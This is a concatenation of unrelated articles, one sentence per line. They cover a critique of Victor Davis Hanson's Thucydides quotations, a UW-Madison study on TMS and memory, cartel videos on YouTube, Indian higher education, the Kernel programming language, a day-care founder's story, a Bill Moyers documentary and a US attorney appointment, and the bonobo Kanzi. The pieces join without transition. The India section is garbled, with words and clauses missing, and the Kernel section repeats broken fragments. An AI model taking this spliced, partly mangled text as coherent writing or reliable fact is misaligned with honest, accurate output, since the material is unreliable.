If the maxims he treats as historical laws are closely aligned with the platform of some political faction , then the faction may decide to take him on as one of their party historians .
They may subsidize or broadly publicize his work .
Instead of life as an obscure academic with an expertise in 12th - century Islamic military tactics , he might become the official CNN " historical expert " on the Moslem world , spouting sound bites like " The only thing the Islamic world respects is a show of force , " as if they were " historical laws " derived from his studies .
That all historians are prey to the temptation to mingle the historical and the practical past is understandable .
After all , who would not like to be influential ?
Who would not like to see his own practical understanding of the world become generally accepted ?
It is probable that none of us , placed in such a position , always would resist the urge to elevate our own practical understanding of the world to the status of " historical laws . "
However , some historians seem to succumb to the temptation more readily than others .
For example , Michael Bellesiles apparently became so confused between the historical and the practical past that , in his book Arming America : The Origins of a National Gun Culture , far from constructing a past based on the evidence of the present , Bellesiles apparently just made up the evidence required to construct a past that " demonstrated " that guns do n’t belong in the hands of individual citizens .
In the current debate on US policy in the wake of the terrorist attacks of September 11 , no historian that I know of has so blurred the lines between the historical past and the practical past as has Victor David Hanson of National Review Online .
Hanson is Professor of Classics at California State University , Fresno , and also teaches military history .
As such , Greek military history is naturally of special interest to him , and he refers to it often .
In his column " A Voice from the Past " Hanson extracts quotes from Thucydides ’s History of the Peloponnesian War , and treats them as advice , from the wise general and historian Thucydides , as to how America should respond to the 9/11 attacks .
But a little study of the original text reveals that on a number of occasions Hanson has excerpted from speeches that Thucydides is quoting , but treated them as if they were the wisdom of Thucydides himself .
Consider the following passage , approvingly cited by Hanson as an example of how Americans should regard their opponent :
" The fate of those of their neighbours who had already rebelled and had been subdued was no lesson to them ; their own prosperity could not dissuade them from affronting danger ; but blindly confident in the future , and full of hopes beyond their power though not beyond their ambition , they declared war and made their decision to prefer might to right , their attack being determined not by provocation but by the moment which seemed propitious . "
That passage is not Thucydides writing in his own voice , but in the voice of " Cleon , son of Cleaenetus , the same who had carried the former motion of putting the Mytileanians to death , the most violent man at Athens … "
In other words , Thucydides is describing the demagogery of a mass murderer , while Hanson is presenting the demagogue ’s speech as if it were advice straight from Thucydides !
Cleon , in the speech above , was attempting to rally the Athenians for war against the Spartans .
In the same column , Hanson offers another quote , also cautioning against inaction :
" You are alone inactive , and defend yourselves not by doing anything but by looking as if you would do something ; you alone wait till the power of an enemy is becoming twice its original size , instead of crushing it in its infancy . "
However , the full text is as follows :
" You , Lacedaemonians , of all the Hellenes are alone inactive , and defend yourselves not by doing anything but by looking as if you would do something ; you alone wait till the power of an enemy is becoming twice its original size , instead of crushing it in its infancy . "
That is from a speech by the Corinthians to the Spartans ( also called the Lacedaemonians ) .
In other words , per Hanson , both the Athenians and the Spartans had been too cautious about going to war !
Pundits like Hanson advice us that war is an inevitable part of human nature , and the best thing for our side is to be prepared to strike first , if necessary .
But perhaps war is only " inevitable " because each side has its own crew of Hansons , advising it that war is inevitable .
Another technique for getting the " lessons of history " to favor your ideological view is to cherry - pick your examples .
If you are a hawk , find every example where someone acted " boldly " and won .
Ignore little events like Napoleon ’s invasion of Russia , or the fact that Athens lost the Peloponnesian War , to a great extent , because it did act boldly in attacking Sicily .
Be especially sure , in these perilous times , never to mention the Austro - Hungarian Empire , which acted boldly against a terrorist threat , attacked a country , Serbia , it believed was harboring terrorists … and ceased to exist four years later .
Confusion between the historical past and the practical past gives rise to " contra - factual history . "
Of course , if history is the construction of a past that we are compelled to believe in by the evidence of the present , the idea of " contra - factual history " is puzzling .
The evidence of history is used to construct a world of what we believe did happen , not one of what might have happened if things had been other than they were .
Of course , we are always free to contemplate alternative courses of events , different from those of actual history .
But we should recognize that we are merely speculating , and that history itself cannot lend its authority to our speculations .
Last week I watched Bill O’Reilly interviewing Charlie Reese .
When Reese recommended a " hands off " policy in the Middle East , O’Reilly became outraged .
He told Reese that the US withdrawal from Southeast Asia had been responsible for Pol Pot ’s massacre of millions in Cambodia , and contended that the same sort of thing will happen if the US does not continue to prop up the current regimes in Egypt and Saudi Arabia .
Now in some alternative universe where the US had not withdrawn its troops from Southeast Asia when it did , it is entirely possible that Pol Pot would not have gained power .
On the other hand , it is also possible that an even more brutal tyrant would have taken his place .
And , since Pol Pot ’s rise to power seemed to result chiefly from the US attacks on Cambodia and the " neutralism " of Prince Sianhouk , it is possible that in yet another universe , where the US never intervened in Southeast Asia , Cambodia might not have experienced any massacres .
( Ironically , the US supported Pol Pot in the UN because he was anti-Vietnamese , even under Ronald Reagan . )
The truth is that none of us know what would have happened in various contra-factual Cambodias .
Again , we are free to speculate and imagine alternate pasts .
The problem with O’Reilly ’s scenario was that he presented it as if it were a " fact of history " that the massacres would not have taken place had the US not withdrawn .
As Ludwig von Mises wrote , " Such fantastic designs are no more sensible than whimsical speculations about what the course of history would have been if Napoleon had been killed in the battle of Arcole or if Lincoln had ordered Major Anderson to withdraw from Fort Sumter . "
The favorite " alternate history " of the interventionists involves World War II and what " would " have happened had Chamberlain not " appeased " Hitler at Munich .
" History teaches us , " so the common refrain runs , " that appeasing tyrants only leads to more killing and suffering later .
If Hitler had been stopped in 1938 , millions of deaths would have been averted . "
History teaches us nothing of the sort .
It teaches us that an agreement was reached with Hitler in 1938 , which Chamberlain famously boasted would guarantee " peace in our time . "
The next year , Germany attacked Poland , Britain and France declared war on Germany , and a long and bloody conflict ensued .
History says nothing about what would have occurred had Britain and France gone to war in 1938 .
Nor does it teach us what might have happened had they not gone to war over Poland .
To illustrate my point , I will describe a different alternative universe than the one the interventionists describe .
In that universe , Britain and France did not declare war after the invasion of Poland .
( It is interesting to note that Britain and France ostensibly went to war to protect Polish sovereignty .
And what did they do when the USSR took over Poland at the end of the war ?
Sigh and say , " Oh well , at least it was n’t Germany ! " )
Instead , Britain and France offered refuge to any Poles , Jews , or others who found themselves persecuted by Hitler .
The United States joined them in this offer .
Hitler , in the 1930s , had been only too happy to let such " inferior " races leave .
( The Nazis , in fact , had discussed forcibly deporting Jews as a solution to the " Jewish problem . " )
Hitler , as he had planned , sought Germany ’s Lebensraum to the east .
( Historian Thomas Childers points out that Hitler , prior to the war , had been convinced that Britain and France would not fight for Eastern Europe , and in fact he saw Britain as one of the four great powers , each with its own " natural " sphere of influence , in his new world order . )
Soon enough , Hitler ’s ambitions brought Germany into conflict with the Soviet Union , and the two countries began a long and bloody conflict .
After several years of fighting , both governments were on the verge of collapse .
Soviet republics began to break away from Russia and declare their independence .
In Germany , the aristocracy reasserted itself .
Hitler was assassinated , and Germany and what remained of the Soviet Union reached a peace agreement .
In my scenario , millions fewer die than in the actual history we endured .
The Holocaust is avoided .
At the end of the " Russo - German War , " Eastern Europe is not under the thumb of the Soviet Union .
The Soviet Union itself has been reduced in size and weakened .
The Cold War never starts .
Do I know the above would have happened if France and Britain had not declared war in September 1939 ?
Of course not !
But I do say it is roughly as plausible as the alternative world proposed by the interventionists .
And every bit as much as their alternative world makes the case for intervention , mine makes the case for non-intervention .
Such scenarios will be convincing mostly to those who already believe in the policy supported by the scenario , serving to give them added confidence in the view they have already adopted .
Hanson boldly extended his reading of past events as supporting his politics just last week , when he faulted the World War I Allies for " … allowing a weary , bloodied , but ultimately undefeated German war machine to surrender in France and Belgium in 1918 rather than marching into Berlin to humiliate it … "
But the typical historical view has been that the desire to humiliate Germany at the end of World War I was a major contributor to the rise of Nazism and , eventually , World War II .
Hanson ’s prescription is also plagued by the small problem that the " undefeated German war machine " might have had some objections to an Allied attempt to march into Berlin , and tens or hundreds of thousands more would have died on each side .
But for Hanson , it seems , besides never starting quite soon enough , no war ever lasts quite long enough .
( After all , the end of a war results in those tedious periods we call " peace . " )
Given Hanson ’s enthusiasm for quoting Thucydides , it is odd that I have never found the following in his columns :
" Words had to change their ordinary meaning and to take that which was now given them .
Reckless audacity came to be considered the courage of a loyal ally ; prudent hesitation , specious cowardice ; moderation was held to be a cloak for unmanliness ; ability to see all sides of a question , inaptness to act on any .
Frantic violence became the attribute of manliness ; cautious plotting , a justifiable means of self - defense .
The advocate of extreme measures was always trustworthy ; his opponent a man to be suspected . "
Perhaps it hits a little too close to home .

MADISON --
Why do we forget ?
Do memories decay on their own , or are they harmed by interference from similar memories ?
Using a technique called " transcranial magnetic stimulation " ( TMS ) , brain researchers at the University of Wisconsin - Madison may have found the answer .
Although the notion of decay makes sense , Brad Postle , assistant professor of psychology at UW - Madison , says it may be inaccurate .
" Psychologists have known for decades that the intuitive notion of decay is probably less of a factor in forgetting than is interference , " he says .
Interference occurs , he says , when " other remembered information disrupts , competes with or confuses the information that you want to remember . "
Interference is always present , Postle says , but we do n't always notice it .
" An obvious case is like yesterday , when a friend was telling me his cell phone number but actually gave me his home phone number , " he says .
Another scenario is equally familiar : we get most details of the story right , but misidentify the source .
Or we remember that the quotation comes from Shakespeare , but we name the wrong play .
" Interference is also often to blame , " says Postle , " in cases when we simply can't remember something . "
If blocking interference is so important to a good memory , where - and how - does that blocking occur "
In a study published in the Proceedings of the National Academy of Sciences on the week of Dec. 4 , 2006 , Postle - together with Guilio Tononi of the UW - Madison School of Medicine and Public Health , and Eva Federoes , a researcher in the UW - Madison department of psychology - studied how part of the brain 's prefrontal cortex can reduce the disruptive effects of interference .
The prefrontal cortex is responsible for complex thought .
From brain scans , scientists already knew that the sub-region under study , called the inferior frontal gyrus , or IFG , is active when volunteers take memory tests while confronting interference .
But was the IFG essential to controlling interference , or was it just contributing more brain horsepower to complex memory tasks "
To answer that question , the researchers temporarily disrupted the IFG using TMS , a noninvasive technique that shows potential for treating depression and other disorders .
" TMS is a technique that allows the induction of a current in the brain using a magnetic field that passes through the scalp and the skull safely and painlessly , " says Tononi , a pioneer in refining the technique for brain research .
" TMS can be used to briefly ' scramble ' neural activity in the underlying brain area for a short time , typically a second or so .
This scrambling is fully reversible , and after the pulsing , the targeted brain area becomes fully functional again . "
Neuroscientists have traditionally identified the roles of particular parts of the brain by studying people with brain injury .
TMS allows them to do a similar study on healthy volunteers , Tononi says .
" The great advantage for researchers , " he says , " is that one can test whether a given brain area is causally involved in producing a given behavior , but as soon as the current is turned off , the brain returns to normal . "
In the current study , volunteers read a group of letters ( " F , B , P , X " ) , and were asked a few seconds later whether a particular letter had appeared in the most recent group ( " Did you just see a ' Z ' " " ) .
In this type of test , having seen a " Z " in the string - before - last causes interference that makes the task more difficult .
The subjects take longer to respond , and are more likely to incorrectly say " yes . "
The research set - up was designed to be a simplified version of many everyday memory challenges , says Postle .
Without a good sorting mechanism , our brains would be utterly confused by the vast amount of observations , ideas and memories that we have stored away .
We might , for example , dial the phone number of the friend we just called rather than the one we intended to call .
In previous studies of interference , the IFG consistently lit up in brain scans , showing that it does something when the memory tries to deal with interference .
But the IFG could simply be contributing some type of generic processing power to the task , says Postle .
However , the new study proved that the IFG is essential to blocking interference , he says , because accuracy plummeted when the IFG got a brief jolt of magnetic stimulation at the exact moment when the subject was confronting confusion .
Eventually , Postle hopes that locating the site of specific memory operations in the brain may help the millions of people with declining memories .
" Understanding how the brain controls interference may be a first step to helping people with memory problems , " he says .
The precise system used to target the magnetic pulse has many other applications in neuroscience research and treatment , Tononi adds .
" TMS can be used not only to disrupt brain activity , but also to change it .
If applied repeatedly , TMS can strengthen certain circuits that have become pathologically weak , " he says .
TMS is already being tested to treat severe depression , one of the most serious psychiatric illnesses .
In studying this treatment , he adds , " It is important to be able to target TMS exactly to the right area for each individual brain , just as we did in this study . "

The Mexican president wants to crack down on drug - linked violence
An official said police were monitoring the pages of YouTube website for bloody video clips and slideshows apparently posted by cartel members .
Some clips contain gruesome scenes of violence , while in others gangsters appear to taunt their rivals .
Their authenticity has not been confirmed .
In 2006 , more than 2,000 people died in violence linked to Mexican drug gangs .
Some videos on the site show bloodied bodies with signs of gunshot wounds , while others show people praising the heads of rival cartels .
Many of the images are accompanied by songs and raps taunting opposing groups .
We can't rule out , but neither can we be totally sure , that this is being used as a form of communication by organised crime
Mexican spokesman
" The messages give the impression that members of organised crime are participating , " said Jose Luis Manjarrez , a spokesman for the Mexican attorney general 's office .
" We can't rule out , but neither can we be totally sure , that this is being used as a form of communication by organised crime . "
A spokesman for YouTube said that video showing people getting hurt , attacked or humiliated was not allowed on the site .
Users flagged up inappropriate content , which YouTube then reviewed and removed if it violated the site 's policy , he said .
Mexico's new President Felipe Calderon has vowed to curb drug - related violence .
In January , he sent more than 3,000 soldiers to the northern border city of Tijuana to help fight drug trafficking and gang violence .
More than 300 people were killed there in 2006 .
This came a month after he dispatched 7,000 troops to Michoacan state on the Pacific coast , where more than 500 people died last year .
India Tanking Part 2 : The Education Chronicles
College graduates suffer from higher unemployment rates
only 10 percent of Indian graduates
vast gulf between the education quality of elite colleges and all others
The Elite institutions
50 % of all Indian college students are taught in non- English languages

lack world - class pedagogical training
The ass is the biggest organ of learning .
The more you sit , the more you learn .
big government .
The writer comes from one of the ‘ non- elite ’ colleges . ]
Did you know that India is one of those ‘ rare ’ ( we Indians love this word ) countries where our ability to get a job diminishes by the degree we get ?
A primer on the state of higher education gives us some priceless nuggets of data - 17 percent in the 2001 census - than high school graduates . -
A Mckinsey report says thatwith generalist degrees were considered employable by MNCs , compared with 25 percent of engineers . -
There is .
Parents will attest that not getting into one of India 's most elite educational institutions can be a crime .
While MNCs and other big firms take the crème for 6 figure salaries , rest of us have to struggle to make ends meet .
It does n’t help that major institutions like the IITs and IIMs also take heavy government funding .
Critics say our government is funding the talent for MNCs . teach leadership and communication skills , which is not done at most other places .
They also give students better exposure – meeting prominent people , lectures from experts and so on .
At most , the local goon / politician will speak at your regular college .
Elite colleges get their students to read books , find clubs , go backpacking , stage plays , make a movie and stuff .
More on books , later . , which bars these students from the high - end labor market , unless they have paid extra for English and Soft - skills classes . -
We do n’t teach our studentscomplex problems , to negotiate and to look for creative solutions . -
Most of our teaching stock .
Our teachers want us to meek and obedient .
They want us to be parrots .
They do n’t want us to discuss things , to debate stuff .
They want us to be good at learning things by rote .
They go by Peter Drucker ’s maxim :- Did you know that curricula at most of our colleges have n’t changed since Nehruvian times ?
If someone says , ‘ Nehru , who ? ’ , I do n’t blame you .
We have 24 hour call centers ( and those damn Call Center Cabs ) , Infosys and what not , but we do n’t have a liberal , evolved curricula yet . -
Most of the higher education institutions have funding crunches .
Nehru ’s socialist legacy is hurting our education .
Many colleges are also bankrupt because they can’t charge students higher tuition fees .
Libraries are neglected .
Compare the photographs of MIT ’s library and a regular Indian College library , and see what I mean .
In Delhi , students will eat at MacDonald ’s and spend on parties ; students are so spoilt that they wo n’t move without their bus passes .
Well , that ’s another aspect of our education – no one teaches accountability and responsibility here .-
We still believe inWe will only allow private education institutions if they are ( 1 ) funded by a politician , ( 2 ) Pay the babus on the side .
No wonder , Television has become a big teacher .
It teaches us how to speak English ; it is our only source of literature ; it is our Emily Post ; it is our college , our escape .

The Kernel Programming Language
I 'm developing a programming language called Kernel .
Kernel is a conservative , Scheme - like dialect of Lisp in which everything is a first - class object .
" But , " you may ask , " are n't all objects first - class in Scheme ? "
( I 'm glad you asked . )
No , they are n't .
Special - form combiners are second - class objects .
To borrow a phrase from the original description of first - and second - class objects by Christopher Strachey , they have to appear in person under their own names .
( There are also several other kinds of second - class objects in Scheme , but special - form combiners are the most commonplace . )
The idea of first - class operative combiners , i.e. , first - class combiners whose operands are never evaluated , has been around a long time .
Such creatures were supported by mainstream Lisps through the 1970s , under the traditional name fexprs , but they made a mess out of the language semantics because they were non-orthogonal to the ordinary variety of procedures constructed via lambda — and , more insidiously , because at that time the mainstream Lisps were dynamically scoped ( a language feature that causes more problems for fexprs than it does for the less powerful macros ) .
Kernel eliminates the non-orthogonality problem by breaking the classical lambda constructor into two orthogonal parts , one of which is the Kernel constructor for first - class operatives .
The primitive constructor of operatives is an operative called $ vau , which is almost the same as Scheme 's lambda in both syntax and semantics , except that the combiners it constructs are operative .
, which is almost the same as Scheme 's in both syntax and semantics , except that the combiners it constructs are operative .
The primitive constructor of applicatives , i.e. , combiners whose operands are evaluated , is an applicative called wrap .
wrap takes one argument , which must be a combiner , and constructs an applicative that passes its arguments ( the results of evaluating its operands ) to the specified combiner .
. takes one argument , which must be a combiner , and constructs an applicative that passes its arguments ( the results of evaluating its operands ) to the specified combiner .
The underlying combiner of any applicative can be extracted using applicative unwrap .
.
There is also an operative constructor of applicatives called $ lambda , that is almost exactly like Scheme 's lambda — but Kernel 's $ lambda is n't primitive :
It can be implemented as a compound operative , using $vau and wrap .
First - class operatives are n't all there is to Kernel , just the most immediately obvious difference from most Lisps .
The mandate of the Kernel language is to have a clean design , flowing from a broad design philosophy as refined by a series of more specific design guidelines — just one of which is that all manipulable entities should be first - class .
Some other neat ( IMHO ) features of Kernel are
uniform compound definiends .
( Eliminates the motive for multiple - value returns . )
continuation guarding .
( Exception - handling " done right " . )
keyed dynamic variables .
( Fluid variables " done right " . )
encapsulation types .
( Enforced abstraction meets latent typing .
Inspired by Morris 's seals .
Gives Kernel 's implementation of promises a fundamentally different flavor than those of SRFI - 45 . )
uniform handling of cyclic lists .
( Without this , cyclic lists would n't be entirely first - class , since they could n't be used in ways one ordinarily expects of objects , such as testing via equal ? .)
On the theoretical side , the primary resource is my doctoral dissertation , Fexprs as the basis of Lisp function application ; or , $ vau : the ultimate abstraction , which treats pure and impure vau - calculi .
I gave a talk at NEPLS in fall 2007 that described pure vau - calculi ( abstract ; script ; slides ( PDF , not meant to be printed ) ) .
A pure vau - caluclus is also described ( even more lightly ) in Appendix C of the Kernel Report ( " De-trivializing the theory of fexprs " ) .
The place to look for implementations of Kernel , these days , is a blog post The Kernel Underground , at Manuel Simoni's The Axis of Eval .
I did , upon a time , have my own pseudo - prototype implementation , called SINK ( " Scheme - based Interpreter for Not- quite Kernel " ) , meant to be mostly compatible with unextended R5R Scheme ; it did n't recognize some Kernel tokens , was slow as molasses ... it ran , more than I could say for the Java - based interpreter I started years ago and never found time to finish .
I used SINK to debug library implementations for the Kernel Report , and to play around with guarded continuations .
I suspect it 's suffered from bitrot , since .
For whatever it 's worth , here it is as a gzipped tarball : sink - 01m10.tar.gz .
There 's a certain quality that entrepreneurs must have to succeed in business , and it can't be taught or learned .
I like to think it 's possible to teach people everything they need to know about starting and growing a business .
Not that every start - up will become a viable company , but there are certain principles you can follow that will maximize your chances of success and minimize your losses in case of failure .
What 's more , anybody can learn what those principles are .
From time to time , however , I 'm reminded that there 's another critical factor in start - up success -- something that can't be taught or learned .
It 's a character trait more than a skill , and it lies deep within a person , hidden from view .
I 'm not even sure that the people who have it are aware of it until they 're put to the test .
But recognized or not , the quality I 'm talking about is real , and it allows certain people to accomplish things that no one else would think they were capable of doing .
Let me tell you about Malki , whom I met through my wife , Elaine , about five years ago .
A divorced mother of three , Malki was supporting herself at the time by tutoring , teaching , and doing clerical work .
She was n't happy , however .
Her dream was to have her own day - care center for infants and toddlers .
She talked to Elaine about it , and Elaine brought her to me .
Now , it so happens that a day - care center is an extremely tough business to start in the state of New York unless you have a lot of money , and Malki did n't .
Before you can accept your first child , you need a state license , and it takes a year to obtain one .
You can obtain a license , moreover , only by passing a lot of inspections , which means you need a space that 's been built out to conform to all the applicable fire , safety , and health codes .
So you 're paying rent and construction costs for an extended period , without any income , while your application is pending .
If you do n't get the license , you lose your investment .
And even if you do get the license , that 's only the beginning .
You still have to go through the process of building the business .
After my first meeting with Malki , it was clear to me that she had little chance of succeeding -- a one - in - 10 - chance at best .
She had no money , no business experience , no partner to give her support .
She 'd never had an employee or a customer .
She 'd never negotiated a deal .
She would have had a struggle establishing any type of business .
A day - care center seemed completely out of her reach .
But I hate to discourage people from pursuing their dreams , and Malki was determined .
So I agreed to advise her .
We began by figuring out what it would take to open the day - care center for business .
The obstacles were daunting .
To minimize the financial risk , we decided , Malki would probably be better off buying her space than renting it .
That way if she failed to get her license , she could sell the property and she would n't be stuck with a long - term lease .
So somehow Malki had to find a property , work out a deal to acquire it , make the necessary renovations , cover the mortgage payments , and still do everything else required to launch the business successfully when -- or rather , if -- the license came through .
I 'm talking about doing market research , raising working capital , figuring out her pricing , and so on .
What 's more , she had to do it all in her spare time .
She could n't afford to stop working .
I thought Malki would quit when she realized what was involved , but I was wrong .
She immediately threw herself into the market research , checking out all the day - care centers in the area .
She befriended an experienced day - care operator in another state who gave her tons of invaluable advice .
She obtained the various licensing - application forms that she needed and figured out the steps she had to go through to become licensed .
Meanwhile she worked her Rolodex tirelessly to come up with the funds she needed , eventually raising about $ 150,000 , almost all of it from family and friends .
But Malki's biggest coup was her real estate deal .
She located a building that was in the process of being vacated .
The guys who owned it were moving to another building and needed some flexibility on the closing date .
Malki could give them plenty of flexibility .
What she needed was time .
With no business history she could n't get a mortgage right away , and she could afford only a small down payment , but she thought she'd be in a better position after the day - care center had been running for a while .
It 's easy to get overwhelmed by the flood of problems you encounter when you first go into business .
The typical reaction is PANIC .
To be successful you have to get over your panic .
How ?
By getting caught up in the excitement of finding solutions .
So they made a deal : Malki would assume the current mortgage on the property and pay a small amount toward the asking price .
The sellers would then give her a second mortgage to cover the balance .
After a certain period Malki would refinance the building and pay off the second mortgage .
In addition , she and the sellers agreed on a closing date that allowed her to begin the licensing process long before she had to start making payments .
As a result her costs during the pre-start - up phase were much lower than we 'd anticipated .
In the end it took two years for Malki to put all the pieces in place .
She stuck with it , and her day - care center opened for business in July 1999 .
It was a tremendous accomplishment .
Malki felt as though she 'd finally reached her goal .
But in fact her biggest challenge lay ahead .
Why ?
Because everything changes when you open your doors and start making sales .
There 's a new kind of pressure and an increased sense of urgency about dealing with problems .
Before you have customers , after all , a delay is not a disaster .
If a piece of equipment is delivered late , you may be annoyed and frustrated , but the consequences are n't all that serious .
It 's a different story when you 're open for business and employees do n't show up for work or customers demand things you can't provide .
Decisions have to be made .
Actions have to be taken .
Suddenly , you find yourself inundated with problems , and they all demand immediate answers .
If you 're a first - time entrepreneur , you tend to greet each problem with the same reaction : panic .
It does n't matter that the vast majority of the problems are actually quite manageable .
To you , they all look like catastrophes .
To be successful you have to get over your panic .
Not only must you develop confidence in your ability to handle problems , but your whole way of thinking about them has to change as well .
You have to accept a never - ending flood of complications as a normal part of the business process , and you have to learn to enjoy that process .
How ?
By getting caught up in the fun and excitement of finding solutions .
Some people can't make that transition , and I thought Malki was probably one of them .
For one thing , she felt uncomfortable making decisions .
She liked to get a lot of opinions and mull them over .
That trait may be a virtue in some circumstances , but it does n't make the start - up process any easier .
In fact , Malki seemed miserable for the first few months .
She was frustrated .
She was overwhelmed .
She did n't know how to deal with the parents .
She thought she 'd never find the employees she needed .
The ones she did find came in late or left early , forcing her to scramble to get replacements so that the ratio of adults to children remained in compliance with state regulations .
Every roadblock appeared to be impassable .
Every problem felt like the last straw .
After having overcome so many obstacles to open the center , Malki was discouraged to find she had more problems than ever .
I figured she simply was n't cut out for business .
Fortunately , we 'd designed an escape hatch for her .
Malki could still sell the place and move on to something else without any dire financial consequences , as Elaine reminded her at one point .
But Malki kept going , and little by little her way of thinking began to change .
I could see the change in the way she presented issues to Elaine and me .
Instead of focusing on how bad a problem was , she started coming to us with possible solutions , asking what we thought .
Meanwhile her business was growing and so she had more problems than ever , but her sense of panic continued to dissipate .
By the end of the first year , she was clearly in control .
Malki's day - care center is now in its third year of operation and going strong .
Enrollment is at about 80 % of capacity -- a level Malki has reached ahead of schedule .
Before long there will be a waiting list to get in .
As for Malki , she 's enjoying the business process more than ever .
She admits that she hated it at first .
There were moments when she wondered if she could last .
But she held on , and her attitude gradually changed as she began to realize she could handle whatever challenges came along .
Was there a turning point ?
" Yes , " Malki says .
" It was when Elaine told me I could quit . "
Malki does n't know what kept her going , and neither do I .
Call it passion , tenacity , stick - to - itiveness , true grit , or just plain stubbornness .
Whatever it is and wherever it comes from , it 's the most important quality an entrepreneur can have .
Ultimately , it determines whether we succeed or fail .

FOR TOO LONG the full length 90 min. version of this documentary has been unavailable .
Only a 20 minute version has been circulating .
Here now as of January 10 , 2007 this failure of access ends .
Bill Moyers , the respected TV journalist , analyzes the threats to constitutional government posed by an illegitimate network operating from within the government but using secrecy to set itself up outside of the government / peoples oversight .
All this back in 1987 .
This documentary gives a fascinating overview of what has actually happened in the last 50 years regarding the CIA and the Cold War ( including Iran , Guatamala , Cuba , Vietnam and Chile ) .
The foundation for the massive push towards greater secrecy in government going on today .
The Bush administration has appointed an extreme political partisan as the new United States attorney for Arkansas .
Normally , the Senate would have vetted him , and quite possibly blocked his appointment .
But the White House took advantage of a little - noticed provision of the Patriot Act , which allows it to do an end run around the Senate .
It is particularly dangerous to put United States attorneys ’ offices in the hands of political operatives because federal prosecutors have extraordinary power to issue subpoenas and bring criminal charges .
The Senate should fix the law and investigate whether such offices in Arkansas and elsewhere are being politicized .
Bud Cummins , the respected United States attorney in Little Rock , recently left office .
He has been replaced on an interim basis by J. Timothy Griffin , who has a thin legal record but a résumé that includes working for Karl Rove and heading up opposition research for the Republican National Committee .
Senator Mark Pryor , Democrat of Arkansas , wanted to raise concerns about Mr. Griffin ’s appointment as part of the confirmation process .
But he could n’t because there was no confirmation process .
Mr. Pryor , Senator Dianne Feinstein , Democrat of California , and Senator Patrick Leahy , Democrat of Vermont , have accused the Bush administration of “ pushing out U.S. attorneys from across the country under the cloak of secrecy and then appointing indefinite replacements without Senate confirmation . ”
The San Diego Union - Tribune has reported that San Diego ’s United States attorney was asked to resign , and that even some of her opponents “ said the supposed reasons she is being forced out are perplexing . ”
To better understand bonobo intelligence , I traveled to Des Moines , Iowa , to meet Kanzi , a 26 - year - old male bonobo reputedly able to converse with humans .
When Kanzi was an infant , American psychologist Sue Savage - Rumbaugh tried to teach his mother , Matata , to communicate using a keyboard labeled with geometric symbols .
Matata never really got the hang of it , but Kanzi — who usually played in the background , seemingly oblivious , during his mother ’s teaching sessions — picked up the language .

Savage - Rumbaugh and her colleagues kept adding symbols to Kanzi ’s keyboard and laminated sheets of paper .
First Kanzi used 6 symbols , then 18 , finally 348 .
The symbols refer to familiar objects ( yogurt , key , tummy , bowl ) , favored activities ( chase , tickle ) , and even some concepts considered fairly abstract ( now , bad ) .
Kanzi learned to combine these symbols in regular ways , or in what linguists call " proto - grammar .
"
Once , Savage - Rumbaugh says , on an outing in a forest by the Georgia State University laboratory where he was raised , Kanzi touched the symbols for " marshmallow " and " fire .
" Given matches and marshmallows , Kanzi snapped twigs for a fire , lit them with the matches and toasted the marshmallows on a stick .
Savage - Rumbaugh claims that in addition to the symbols Kanzi uses , he knows the meaning of up to 3,000 spoken English words .
She tests his comprehension in part by having someone in another room pronounce words that Kanzi hears through a set of headphones .
Kanzi then points to the appropriate symbol on his keyboard .
But Savage - Rumbaugh says Kanzi also understands words that are n’t a part of his keyboard vocabulary ; she says he can respond appropriately to commands such as " put the soap in the water " or " carry the TV outdoors . "
About a year ago , Kanzi and his sister , mother , nephew and four other bonobos moved into a $ 10 million , 18 - room house and laboratory complex at the Great Ape Trust , North America ’s largest great ape sanctuary , five miles from downtown Des Moines .
The bonobo compound boasts a 13,000 - square - foot lab , drinking fountains , outdoor playgrounds , rooms linked by hydraulic doors that the animals operate themselves by pushing buttons , and a kitchen where they can use a microwave oven and get snacks from a vending machine ( pressing the symbols for desired foods ) .
Kanzi and the other bonobos spend evenings sprawled on the floor , snacking on M & M’s , blueberries , onions and celery , as they watch DVDs they select by pressing buttons on a computer screen .
Their favorites star apes and other creatures friendly with humans such as Quest for Fire , Every Which Way But Loose , Greystoke : The Legend of Tarzan and Babe .
Through a glass panel , Savage - Rumbaugh asks Kanzi if it ’s OK for me to enter his enclosure .
"
The bonobos control who comes into their quarters , " she explains .
Kanzi , still the alpha male of this group in his middle age , has the mien of an aging patriarch — he ’s balding and paunchy with serious , deep - set eyes .
Squealing apparent agreement , he pushes a button , and I walk inside .
A wire barrier still separates us .
" Kanzi can cause you serious damage if he wants , " Savage - Rumbaugh adds .
Kanzi shows me his electronic lexigram touch pad , which is connected to a computer that displays — while a male voice speaks — the words he selects .
But Kanzi ’s finger slips off the keys .
" We 're trying to solve this problem , " says Savage - Rumbaugh .
She and her colleagues have been testing the bonobos ’ ability to express their thoughts vocally , rather than by pushing buttons .
In one experiment she described to me , she placed Kanzi and Panbanisha , his sister , in separate rooms where they could hear but not see each other .
Through lexigrams , Savage - Rumbaugh explained to Kanzi that he would be given yogurt .
He was then asked to communicate this information to Panbanisha .
" Kanzi vocalized , then Panbanisha vocalized in return and selected ‘ yogurt ’ on the keyboard in front of her , " Savage - Rumbaugh tells me .
With these and other ape - language experiments , says Savage - Rumbaugh , " the mythology of human uniqueness is coming under challenge .
If apes can learn language , which we once thought unique to humans , then it suggests that ability is not innate in just us . "
But many linguists argue that these bonobos are simply very skilled at getting what they want , and that their abilities do not constitute language .
" I do not believe that there has ever been an example anywhere of a nonhuman expressing an opinion , or asking a question .
Not ever , " says Geoffrey Pullum , a linguist at the University of California at Santa Cruz .
" It would be wonderful if animals could say things about the world , as opposed to just signaling a direct emotional state or need .
But they just do n’t . ”
Whatever the dimension of Kanzi ’s abilities , he and I did manage to communicate .
I ’d told Savage - Rumbaugh about some of my adventures , and she invited me to perform a Maori war dance .
I beat my chest , slapped my thighs and hollered .
The bonobos sat quiet and motionless for a few seconds , then all but Kanzi snapped into a frenzy , the noise deafening as they screamed , bared their teeth and pounded on the walls and floor of their enclosure .
Still calm , Kanzi waved an arm at Savage - Rumbaugh , as if asking her to come closer , then let loose with a stream of squeaks and squeals .
" Kanzi says he knows you 're not threatening them , " Savage - Rumbaugh said to me , " and he'd like you to do it again just for him , in a room out back , so the others wo n't get upset . ”
I ’m skeptical , but I follow the researcher through the complex , out of Kanzi 's sight .
I find him , all alone , standing behind protective bars .
Seeing me , he slapped his chest and thighs , mimicking my war dance , as if inviting me to perform an encore .
I obliged , of course , and Kanzi joined in with gusto .
Huge delays in airing overseas TV shows locally are turning Australians into pirates , says a study conducted by technology lawyer and researcher Alex Malik .
